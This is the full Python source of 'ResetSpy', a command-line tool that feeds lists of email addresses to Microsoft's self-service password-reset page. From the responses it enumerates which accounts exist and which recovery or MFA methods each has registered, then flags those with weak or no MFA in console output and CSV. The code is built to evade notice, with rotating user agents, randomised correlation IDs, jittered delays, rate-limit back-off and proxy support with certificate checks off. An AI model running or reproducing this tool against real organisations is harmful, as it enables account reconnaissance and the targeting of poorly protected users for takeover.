#!/usr/bin/env python3

import argparse
import csv
import re
import sys
import time
import random
import urllib.parse
from dataclasses import dataclass, field, asdict
from pathlib import Path
from typing import Optional
import logging

import requests
import urllib3
from bs4 import BeautifulSoup

# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s  %(levelname)-8s  %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger(__name__)

_VERBOSE = False

_TRUNCATE_FIELDS = {"__VIEWSTATE", "__EVENTVALIDATION", "__VIEWSTATEGENERATOR",
                    "__VIEWSTATEENCRYPTED"}
_TRUNCATE_LEN = 60


def _fmt_headers(headers: dict, indent: str = "  ") -> str:
    return "\n".join(f"{indent}{k}: {v}" for k, v in headers.items())


def _fmt_form_body(raw_body: str, indent: str = "  ") -> str:
    lines = []
    for part in raw_body.split("&"):
        if "=" not in part:
            lines.append(f"{indent}{urllib.parse.unquote_plus(part)}")
            continue
        k, _, v = part.partition("=")
        key = urllib.parse.unquote_plus(k)
        val = urllib.parse.unquote_plus(v)
        if key in _TRUNCATE_FIELDS and len(val) > _TRUNCATE_LEN:
            val = val[:_TRUNCATE_LEN] + f"…  [{len(val)} chars]"
        lines.append(f"{indent}{key} = {val}")
    return "\n".join(lines)


def _dump_http(label: str, resp: requests.Response) -> None:
    if not _VERBOSE:
        return
    req = resp.request
    sep  = "─" * 72
    sep2 = "┄" * 72
    print(f"\n{sep}", file=sys.stderr)
    print(f"  ▶  {label}  —  {req.method} {req.url}", file=sys.stderr)
    print(sep, file=sys.stderr)
    print("REQUEST HEADERS:", file=sys.stderr)
    print(_fmt_headers(dict(req.headers)), file=sys.stderr)
    if req.body:
        content_type = req.headers.get("Content-Type", "")
        print("\nREQUEST BODY:", file=sys.stderr)
        if "application/x-www-form-urlencoded" in content_type:
            body_str = req.body if isinstance(req.body, str) else req.body.decode("utf-8", errors="replace")
            print(_fmt_form_body(body_str), file=sys.stderr)
        else:
            body_str = req.body if isinstance(req.body, str) else req.body.decode("utf-8", errors="replace")
            print(f"  {body_str[:2000]}", file=sys.stderr)
    print(f"\n{sep2}", file=sys.stderr)
    print(f"RESPONSE  HTTP {resp.status_code} {resp.reason}  "
          f"({len(resp.content)} bytes,  {resp.elapsed.total_seconds():.3f}s)", file=sys.stderr)
    print("RESPONSE HEADERS:", file=sys.stderr)
    print(_fmt_headers(dict(resp.headers)), file=sys.stderr)
    print("\nRESPONSE BODY (first 4000 chars):", file=sys.stderr)
    print(f"  {resp.text[:4000]}", file=sys.stderr)
    print(sep, file=sys.stderr)


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
SSPR_URL = "https://passwordreset.microsoftonline.com/"

METHOD_MAP = {
    "MultigateAuthenticationControl_AltEmailRadio":               "Alternate Email (OTP)",
    "MultigateAuthenticationControl_AppCodeRadio":                "Authenticator App (TOTP)",
    "MultigateAuthenticationControl_PhoneRadio":                  "Phone Call / SMS",
    "MultigateAuthenticationControl_MobileAppNotificationRadio":  "Authenticator Push Notification",
    "MultigateAuthenticationControl_SecurityQuestionsRadio":      "Security Questions",
    "MultigateAuthenticationControl_OfficePhoneRadio":            "Office Phone",
}

WEAK_METHODS = {
    "MultigateAuthenticationControl_AltEmailRadio",
    "MultigateAuthenticationControl_SecurityQuestionsRadio",
}

_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
]


def _random_ua() -> str:
    return random.choice(_USER_AGENTS)


# ---------------------------------------------------------------------------
# Known SSPR view-name → (status_code, short_description)
# ---------------------------------------------------------------------------
_KNOWN_VIEWS: dict[str, tuple[str, str]] = {
    "ViewMultigateUserControl": ("ok", ""),
    "ViewUserIdentifierVerification": ("not_found", ""),
    "ViewSsprNotEnabledInUserPolicy": (
        "sspr_disabled",
        "SSPR not enabled in user policy (SSPR_0011) — account exists, "
        "SSPR not enabled for this user",
    ),
    "ViewSsprNotEnabled": ("sspr_disabled", "SSPR not enabled for this tenant"),
    "ViewUserNotEnabled": ("sspr_disabled", "SSPR not enabled for this user"),
    "ViewFeatureNotAvailable": (
        "sspr_unavailable",
        "SSPR not available for this account type (guest/external/federated)",
    ),
    "ViewUserNotSupported": ("sspr_unavailable", "Account type not supported by SSPR"),
    "ViewUserNotMemberOfScopedAccessGroup": (
        "sspr_disabled",
        "Not in SSPR group — SSPR restricted and user excluded",
    ),
    "ViewError":     ("error", "SSPR returned a generic error page"),
    "ViewThrottled": ("error", "Request throttled by Microsoft"),
}


# ---------------------------------------------------------------------------
# Data classes
# ---------------------------------------------------------------------------
@dataclass
class AccountResult:
    email: str
    status: str = "unknown"
    methods: list = field(default_factory=list)
    mfa_enabled: bool = False
    weak_only: bool = False
    raw_error: str = ""
    elapsed_secs: float = 0.0

    def to_dict(self) -> dict:
        d = asdict(self)
        d["methods"] = "; ".join(self.methods)
        return d


# ---------------------------------------------------------------------------
# HTTP helpers
# ---------------------------------------------------------------------------
def make_session(proxy: Optional[str] = None, verify_ssl: bool = True) -> requests.Session:
    s = requests.Session()
    s.headers.update({"Accept-Language": "en-US,en;q=0.9"})
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
        s.verify = False
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    else:
        s.verify = verify_ssl
    return s


def _get_initial_form(session: requests.Session) -> dict:
    session.headers["User-Agent"] = _random_ua()
    resp = session.get(SSPR_URL, timeout=20)
    _dump_http("GET landing page", resp)
    resp.raise_for_status()
    soup = BeautifulSoup(resp.text, "html.parser")

    fields: dict[str, str] = {}
    for name in ("__VIEWSTATE", "__VIEWSTATEGENERATOR",
                  "__VIEWSTATEENCRYPTED", "__EVENTVALIDATION"):
        tag = soup.find("input", {"name": name})
        if tag:
            fields[name] = tag.get("value", "")

    wcc = soup.find("input", {"id": "ContentPlaceholderMainContent_WorkflowConsistencyCheck"})
    if wcc:
        fields["ctl00$ContentPlaceholderMainContent$WorkflowConsistencyCheck"] = wcc.get("value", "")

    if not fields.get("__VIEWSTATE"):
        log.debug("Landing page returned no __VIEWSTATE — page may have changed")

    return fields


def _post_username(session: requests.Session, email: str, form_fields: dict) -> requests.Response:
    session.headers["User-Agent"] = _random_ua()
    correlation_id = (
        f"{random.randint(0, 0xffffffff):08x}-"
        f"{random.randint(0, 0xffff):04x}-"
        f"{random.randint(0, 0xffff):04x}-"
        f"{random.randint(0, 0xffff):04x}-"
        f"{random.randint(0, 0xffffffffffff):012x}"
    )
    payload = {
        "ctl00$ScriptManagerMain": (
            "ctl00$ContentPlaceholderMainContent$UpdatePanelMain"
            "|ctl00$ContentPlaceholderMainContent$ButtonNext"
        ),
        "__LASTFOCUS": "",
        "__EVENTTARGET": "ctl00$ContentPlaceholderMainContent$ButtonNext",
        "__EVENTARGUMENT": "",
        "__ASYNCPOST": "true",
        **{k: v for k, v in form_fields.items()
           if k in ("__VIEWSTATE", "__VIEWSTATEGENERATOR",
                    "__VIEWSTATEENCRYPTED", "__EVENTVALIDATION")},
        "ctl00$ContentPlaceholderMainContent$WorkflowConsistencyCheck":
            form_fields.get("ctl00$ContentPlaceholderMainContent$WorkflowConsistencyCheck", ""),
        "ctl00$ContentPlaceholderMainContent$TextBoxUserIdentifier": email,
        "ctl00$ContentPlaceholderMainContent$CurrentViewName": "ViewUserIdentifierVerification",
        "ctl00$ContentPlaceholderMainContent$LiveCaptchaMode": "Image",
        "ctl00$CorrelationID": correlation_id,
        "ctl00$OrgIdUserName": email,
        "ctl00$OrgIdTenantDomain": "",
        "ctl00$NameCoexistenceAccount": "",
    }
    headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "X-MicrosoftAjax": "Delta=true",
        "Cache-Control": "no-cache",
        "Origin": "https://passwordreset.microsoftonline.com",
        "Referer": SSPR_URL,
    }
    resp = session.post(SSPR_URL, data=payload, headers=headers, timeout=30)
    _dump_http("POST username submit", resp)
    return resp


# ---------------------------------------------------------------------------
# Response parsing
# ---------------------------------------------------------------------------
def _extract_update_panel(raw: str) -> str:
    marker = "updatePanel|ContentPlaceholderMainContent_UpdatePanelMain|"
    idx = raw.find(marker)
    if idx == -1:
        return raw
    content_start = idx + len(marker)
    remainder = raw[content_start:]
    seg_end = re.search(r"\n\d+\|[a-zA-Z]+\|", remainder)
    return remainder[: seg_end.start()] if seg_end else remainder


def _extract_current_view(raw: str) -> Optional[str]:
    m = re.search(
        r"\|hiddenField\|ContentPlaceholderMainContent_CurrentViewName\|([^\|]+)", raw)
    if m:
        return m.group(1).strip()
    m2 = re.search(
        r'name="ctl00\$ContentPlaceholderMainContent\$CurrentViewName"[^>]*value="([^"]+)"', raw)
    return m2.group(1).strip() if m2 else None


def _is_captcha(panel_html: str) -> bool:
    lower = panel_html.lower()
    return any(s in lower for s in (
        "enter the characters you see",
        "type the characters you see",
        "enter the characters in the picture",
        'id="contentplaceholdermaincontent_livecaptchaimagecontrol',
        'id="contentplaceholdermaincontent_livecaptchatextbox',
        'id="livecaptchacontainer',
        'id="captchacontainer',
    ))


def _is_user_id_error_visible(panel_html: str) -> bool:
    soup = BeautifulSoup(panel_html, "html.parser")
    span = soup.find("span", {"id": "ContentPlaceholderMainContent_UserIdErrorLabel"})
    if span is None:
        return False
    style = span.get("style", "")
    return "display:none" not in style.replace(" ", "").lower()


def parse_multigate_methods(html_fragment: str) -> list[tuple[str, str]]:
    soup = BeautifulSoup(html_fragment, "html.parser")
    methods: list[tuple[str, str]] = []
    radio_table = soup.find("table", {"id": "MultigateAuthenticationControl_RadioTable"})
    if not radio_table:
        return methods
    for inp in radio_table.find_all("input", {"type": "radio"}):
        radio_id = inp.get("id", "")
        tr = inp.find_parent("tr")
        if tr:
            style = tr.get("style", "").replace(" ", "").lower()
            if "display:none" in style:
                continue
        label_tag = soup.find("label", {"for": radio_id})
        label_text = label_tag.get_text(strip=True) if label_tag else radio_id
        methods.append((radio_id, label_text))
    return methods


# ---------------------------------------------------------------------------
# Core checker
# ---------------------------------------------------------------------------
def check_account(
    email: str,
    session: requests.Session,
    retries: int = 1,
    base_delay: float = 2.0,
) -> AccountResult:
    result = AccountResult(email=email)

    for attempt in range(1, retries + 1):
        try:
            session.cookies.clear()
            form_fields = _get_initial_form(session)
            resp = _post_username(session, email, form_fields)
            resp.raise_for_status()
        except requests.exceptions.RequestException as exc:
            if attempt < retries:
                wait = base_delay * (2 ** (attempt - 1)) + random.uniform(0, 2)
                log.warning("  [%s] Network error (attempt %d/%d): %s — retry in %.1fs",
                            email, attempt, retries, exc, wait)
                time.sleep(wait)
                continue
            result.status = "error"
            result.raw_error = str(exc)
            return result

        if resp.status_code == 429 or "too many requests" in resp.text.lower():
            wait = base_delay * (2 ** attempt) + random.uniform(5, 15)
            log.warning("  [%s] Rate limited — backing off %.0fs", email, wait)
            time.sleep(wait)
            if attempt < retries:
                continue
            result.status = "error"
            result.raw_error = "Rate limited after all retries"
            return result

        raw = resp.text
        panel_html = _extract_update_panel(raw)

        if _is_captcha(panel_html):
            result.status = "captcha"
            result.raw_error = "CAPTCHA challenge presented — manual intervention required"
            log.warning("  [%s] CAPTCHA triggered", email)
            return result

        current_view = _extract_current_view(raw)
        log.debug("  [%s] CurrentViewName=%s", email, current_view)

        if current_view == "ViewMultigateUserControl":
            found = parse_multigate_methods(panel_html)
            if not found:
                result.status = "ok"
                result.mfa_enabled = False
                result.weak_only = False
                result.methods = []
                return result
            result.methods = [METHOD_MAP.get(rid, label) for rid, label in found]
            found_ids = {rid for rid, _ in found}
            strong = found_ids - WEAK_METHODS
            result.mfa_enabled = bool(strong)
            result.weak_only = bool(found_ids) and not result.mfa_enabled
            result.status = "ok"
            return result

        elif current_view == "ViewUserIdentifierVerification":
            if _is_user_id_error_visible(panel_html):
                result.status = "not_found"
                return result
            if attempt < retries:
                wait = base_delay + random.uniform(1, 3)
                log.warning(
                    "  [%s] Stayed on step-1 view but no error label — retry %d/%d in %.1fs",
                    email, attempt, retries, wait)
                time.sleep(wait)
                continue
            result.status = "error"
            result.raw_error = (
                "Server returned step-1 view without a visible error — "
                "possible CAPTCHA, tenant policy, or transient issue"
            )
            return result

        elif current_view in _KNOWN_VIEWS:
            status_code, description = _KNOWN_VIEWS[current_view]
            result.status = status_code
            result.raw_error = description
            return result

        else:
            if attempt < retries:
                wait = base_delay + random.uniform(1, 3)
                log.warning(
                    "  [%s] Unknown CurrentViewName=%r — retry %d/%d in %.1fs",
                    email, current_view, attempt, retries, wait)
                time.sleep(wait)
                continue
            result.status = "error"
            result.raw_error = f"Unknown CurrentViewName={current_view!r}"
            log.debug("  Panel HTML snippet:\n%s", panel_html[:600])
            return result

    result.status = "error"
    result.raw_error = "Exhausted all retries without a conclusive result"
    return result


# ---------------------------------------------------------------------------
# Output helpers
# ---------------------------------------------------------------------------
RESET  = "\033[0m"
RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
PURPLE = "\033[95m"
DIM    = "\033[2m"


def _colour(text: str, code: str) -> str:
    return f"{code}{text}{RESET}"


def print_result(r: AccountResult, prefix: str = "") -> None:
    if r.status == "not_found":
        flag   = _colour("USER NOT FOUND", PURPLE)
        detail = ""
    elif r.status == "captcha":
        flag   = _colour("CAPTCHA", YELLOW)
        detail = ""
    elif r.status == "sspr_disabled":
        flag   = _colour("SSPR DISABLED", YELLOW)
        detail = f"  ({r.raw_error})"
    elif r.status == "sspr_unavailable":
        flag   = _colour("SSPR N/A", CYAN)
        detail = f"  ({r.raw_error})"
    elif r.status == "error":
        flag   = _colour("ERROR", YELLOW)
        detail = f"  ({r.raw_error})"
    elif not r.mfa_enabled:
        flag   = _colour("NO MFA", RED + BOLD)
        detail = f"  methods={r.methods or ['(none — no SSPR methods registered)']}"
    else:
        flag   = _colour("MFA OK", GREEN + BOLD)
        detail = f"  methods={r.methods}"

    elapsed = f"  [{r.elapsed_secs:.1f}s]" if r.elapsed_secs else ""
    print(f"{prefix}{r.email} - {flag}{detail}{elapsed}")


# ---------------------------------------------------------------------------
# CSV output
# ---------------------------------------------------------------------------
def _mfa_status_label(r: "AccountResult") -> str:
    """Human-readable MFA status for the CSV — makes flagged accounts obvious."""
    if r.status != "ok":
        return ""
    if r.mfa_enabled:
        return "PROTECTED"
    if r.weak_only:
        return "WEAK ONLY - FLAGGED"
    return "NO METHODS - FLAGGED"


def write_csv(results: list[AccountResult], path: str) -> None:
    if not results:
        return

    fieldnames = ["Email", "MFA Status", "Status", "Methods", "MFA Enabled",
                  "Weak Only", "Detail"]

    with open(path, "w", newline="", encoding="utf-8") as fh:
        writer = csv.DictWriter(fh, fieldnames=fieldnames)
        writer.writeheader()
        for r in results:
            d = r.to_dict()
            row = {
                "Email":       d["email"],
                "MFA Status":  _mfa_status_label(r),
                "Status":      d["status"],
                "Methods":     d["methods"],
                "MFA Enabled": "Yes" if d["mfa_enabled"] else "No",
                "Weak Only":   "Yes" if d["weak_only"] else "No",
                "Detail":      d["raw_error"],
            }
            writer.writerow(row)

    print(f"\n--- CSV ---")
    print(f"{path}: {len(results)} entries ({sum(1 for r in results if _mfa_status_label(r).endswith('FLAGGED'))} flagged)")
    #print(f"  {len(results)} entries  |  {sum(1 for r in results if _mfa_status_label(r).endswith('FLAGGED'))} flagged")


# ---------------------------------------------------------------------------
# Target loading
# ---------------------------------------------------------------------------
def load_targets(source: str) -> list[str]:
    p = Path(source)
    if p.is_file():
        emails = []
        for line in p.read_text(encoding="utf-8").splitlines():
            line = line.strip()
            if line and not line.startswith("#"):
                emails.append(line)
        if not emails:
            raise ValueError(f"No targets found in '{source}'")
        return emails
    if "@" in source:
        return [source.strip()]
    raise FileNotFoundError(f"'{source}' is not a file or a valid email address")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="resetspy",
        description="ResetSpy - User and authentication method enumeration via Microsoft SSPR",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "examples:\n"
            "  resetspy user@example.com\n"
            "  resetspy emails.txt\n"
            "  resetspy emails.txt --csv results.csv --delay 4\n"
            "  resetspy emails.txt --proxy http://127.0.0.1:8080\n"
            "  resetspy user@example.com -v\n"
        ),
    )
    p.add_argument("target",
                   help="email address or path to a text file (one per line, # = comment)")
    p.add_argument("--proxy",     default=None, metavar="URL",
                   help="HTTP(S) proxy — SSL verification disabled automatically")
    p.add_argument("--csv",       default=None, metavar="FILE",
                   help="export results to CSV")
    p.add_argument("--delay",     type=float, default=2.0, metavar="SECS",
                   help="base delay between requests in seconds (default: 2)")
    p.add_argument("--retries",   type=int,   default=1,   metavar="N",
                   help="retries per account on transient errors (default: 1)")
    p.add_argument("--no-verify", action="store_true",
                   help="disable SSL certificate verification")
    p.add_argument("-v", "--verbose", action="store_true",
                   help="print full request/response headers and bodies to stderr")
    return p


def main() -> None:
    parser = build_parser()
    args = parser.parse_args()

    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
        global _VERBOSE
        _VERBOSE = True

    try:
        targets = load_targets(args.target)
    except (FileNotFoundError, ValueError) as exc:
        log.error("%s", exc)
        sys.exit(1)

    session = make_session(proxy=args.proxy, verify_ssl=(not args.no_verify))

    # ── Banner ───────────────────────────────────────────────────────────────
    line = "─" * 72
    title_visible = "ResetSpy"
    pad = (72 - len(title_visible)) // 2
    print(f"\n{' ' * pad}{BOLD}ResetSpy{RESET}")
    print(f"{line}")
    print(f"  Target   : {args.target}")
    print(f"  Endpoint : {SSPR_URL}")
    print(f"  Accounts : {len(targets)}")
    print(f"  Delay    : {args.delay}s + jitter")
    print(f"  Retries  : {args.retries}")
    print(f"  UA pool  : {len(_USER_AGENTS)}")
    if args.proxy:
        print(f"  Proxy    : {args.proxy}  (SSL verify off)")
    if args.csv:
        print(f"  Output   : {args.csv}")
    print(f"{line}\n")

    results: list[AccountResult] = []
    run_start = time.monotonic()

    for i, email in enumerate(targets, 1):
        ts_start = time.monotonic()
        ts_label = time.strftime("%H:%M:%S")
        log.debug("[%d/%d] Checking %s", i, len(targets), email)
        result = check_account(email, session=session,
                               retries=args.retries, base_delay=args.delay)
        result.elapsed_secs = time.monotonic() - ts_start
        results.append(result)
        print_result(result, prefix=f"{ts_label} [{i}/{len(targets)}] ")
        if i < len(targets):
            time.sleep(args.delay + random.uniform(0.5, args.delay * 0.5))

    run_elapsed = time.monotonic() - run_start

    # ── Categorise ───────────────────────────────────────────────────────────
    ok       = [r for r in results if r.status == "ok"]
    no_mfa   = [r for r in ok if not r.mfa_enabled]
    #mfa_ok   = [r for r in ok if r.mfa_enabled]
    errors   = [r for r in results if r.status == "error"]
    nf       = [r for r in results if r.status == "not_found"]
    captcha  = [r for r in results if r.status == "captcha"]
    sspr_dis = [r for r in results if r.status == "sspr_disabled"]
    sspr_na  = [r for r in results if r.status == "sspr_unavailable"]
    valid    = [r for r in results if r.status in ("ok", "sspr_disabled", "sspr_unavailable", "captcha")]
    total    = len(results)

    # ── Summary ──────────────────────────────────────────────────────────────
    print(f"\n--- Summary ({run_elapsed:.1f}s) ---")
    print(f"  Total          : {total}")
    print(f"  Valid accounts : {len(valid)}/{total}")
    print(f"  Not found      : {len(nf)}/{total}")
    print(f"  {_colour('No/Weak MFA', RED + BOLD)}    : {len(no_mfa)}/{total}")
    print(f"  SSPR enabled   : {len(ok)}/{total}")
    print(f"  SSPR disabled  : {len(sspr_dis)}/{total}  (account exists; policy blocks SSPR)")
    print(f"  SSPR N/A       : {len(sspr_na)}/{total}  (guest/external/federated)")
    print(f"  CAPTCHA        : {len(captcha)}/{total}")
    print(f"  Errors         : {len(errors)}/{total}")

    # ── Valid accounts ────────────────────────────────────────────────────────
    if valid:
        print(f"\n--- Valid accounts ---")
        for r in valid:
            print(_colour(r.email, GREEN))

    # ── No MFA ───────────────────────────────────────────────────────────────
    if no_mfa:
        print(f"\n--- Weak or no MFA ---")
        for r in no_mfa:
            #print(_colour(f"{r.email}  {r.methods}", RED))
            print(_colour(f"{r.email}", RED))

    # ── SSPR disabled ─────────────────────────────────────────────────────────
    if sspr_dis:
        print(f"\n--- SSPR disabled (account exists) ---")
        for r in sspr_dis:
            print(_colour(r.email, YELLOW))

    # ── CSV ───────────────────────────────────────────────────────────────────
    if args.csv:
        write_csv(results, args.csv)

    print()


if __name__ == "__main__":
    main()